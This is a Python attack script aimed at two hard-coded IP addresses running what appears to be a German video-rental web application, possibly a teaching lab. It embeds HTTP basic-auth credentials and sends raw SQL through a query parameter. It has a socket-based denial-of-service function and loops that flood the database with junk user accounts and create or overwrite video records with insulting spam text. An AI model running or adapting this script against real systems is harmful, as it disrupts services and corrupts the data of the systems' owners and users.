from subprocess import call
from random import randint
import socket
import time
import requests
import itertools

ADD_USER_POST_URL = ["http://85.214.224.63/adduser.php?domain=Anmeldung&used_table=kunden",
                     "http://130.73.201.41/adduser.php?domain=Anmeldung&used_table=kunden"]
ADD_USER_AUTH = requests.auth.HTTPBasicAuth("anme", "emna")
ADD_VIDEO_POST_URL = ["http://85.214.224.63/ein_search.php?domain=Einkauf",
                      "http://130.73.201.41/ein_search.php?domain=Einkauf"]
EDIT_VIDEO_POST_URL = ["http://85.214.224.63/update_videos.php?domain=einkauf&used_table=videos%22",
                       "http://130.73.201.41/update_videos.php?domain=einkauf&used_table=videos%22"]
ADD_VIDEO_AUTH = requests.auth.HTTPBasicAuth("eink", "knie")
SQL_QUERY = "sql_abfrage=SELECT+*+FROM+kunden%2C+videos%2C+ausleihe+WHERE+ausleihe.kunr+LIKE+%27%25{}%25%27+GROUP+BY+kunden.kustras++ORDER+BY+kunden.kuort&domain=Geschaeftsfuehrung&num=0&limit=10000&submit=Query+abschicken%21"
error_count = 0

addUser_count = 0
addVideo_count = 0
editVideo_count = 0

def printStats():
    global addUser_count
    global addVideo_count
    global editVideo_count
    while True:
        time.sleep(5)
        print "[running]", addUser_count, "users added\t", addVideo_count, "videos added\t", editVideo_count, "videos edited\t"

def execx():
    call(["./vcenter.sh", SQL_QUERY.format(randint(0, 2000))])

def httpDos():
    global error_count
    for i in range(0, 10):
            mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                    mysocket.connect(("130.73.201.41", 80))
                    mysocket.send("GET " + 100 * SQL_QUERY + "HTTP/1.1\r\n")
                    mysocket.sendto("GET " + 100 * SQL_QUERY + "HTTP/1.1\r\n", ("130.73.201.41", 80))
            except socket.error:
                    error_count += 1
            mysocket.close()

def addUser(lname, fname, street, postalCode, place, tel, born, sex, note):
    user = {'kuname': lname, 'kuvorna': fname, 'kustras': street, 'kuplz': postalCode,
        'kuort': place, 'kutel': tel, 'kugebdat': born, 'kusex': sex, 'kumerk': note}
    for url in ADD_USER_POST_URL:
            response = requests.post(url, auth=ADD_USER_AUTH, data=user)
    
    global addUser_count
    addUser_count += 1

def addVideo(title = "", director = "", genre = "", length = "", fsk = "", description = "", role1 = "", role2 = "", role3 = ""):
    video = {'domain': 'Einkauf', 'vinr': '', 'start': '', 'vititel': title,
             'viregie': director, 'viart': genre, 'vidauer': length, 'vifsk': fsk,
             'viinhalt': description, 'vidarsteller1': role1, 'vidarsteller2': role2,
             'vidarsteller3': role3}
    for url in ADD_VIDEO_POST_URL:
        response = requests.post(url, auth=ADD_VIDEO_AUTH, data=video)

    global addVideo_count
    addVideo_count += 1

def editVideo(id, title = "", director = "", genre = "", length = "", fsk = "",
              description = "", role1 = "", role2 = "", role3 = ""):
    video = {'vinr': id, 'vititel': title, 'viregie': director, 'viart': genre,
             'vidauer': length, 'vifsk': fsk, 'viinhalt': description,
             'vidarsteller1': role1, 'vidarsteller2': role2, 'vidarsteller3': role3}
    for url in EDIT_VIDEO_POST_URL:
        response = requests.post(url, auth=ADD_VIDEO_AUTH, data=video)

    global editVideo_count
    editVideo_count += 1


def addFrikas(letters):
    for i in range(4,5):
            for j in map(''.join, itertools.product(letters, repeat=i)):
                    addUser("xXDaiMuddahHDXx {}".format(j), "Imperator", "ne lass mal", "12345", "Poofingen an der Zichte", "666", "1933-01-31", "w", "Diese Person ist gefaehrlich, halten sie sie von Essen fern!")

def videoSpam(minrange, maxrange):
    for i in range(minrange, maxrange):
        addVideo(title = "DaiMuddah geht shoppen Teil {}".format(i), director = "Til Schweiger", genre = "Fettsucht hoch {}".format(i/7), length = str(randint(1, 180)), fsk = "18", description = "Verstoerenede Bilder - empfohlen ab 35 Jahren", role1 = "DaiMuddah", role2 = "Til Schweiger", role3 = "Felix von den Laeden")

def editVideos(minrange, maxrange):
    for i in range(minrange, maxrange):
        editVideo(i, title = "DaiMuddah geht shoppen Teil {}".format(i), director = "Til Schweiger", genre = "Fettsucht hoch {}".format(i/7), length = str(randint(1, 180)), fsk = "18", description = "Verstoerenede Bilder - empfohlen ab 35 Jahren", role1 = "DaiMuddah", role2 = "Til Schweiger", role3 = "Felix von den Laeden")

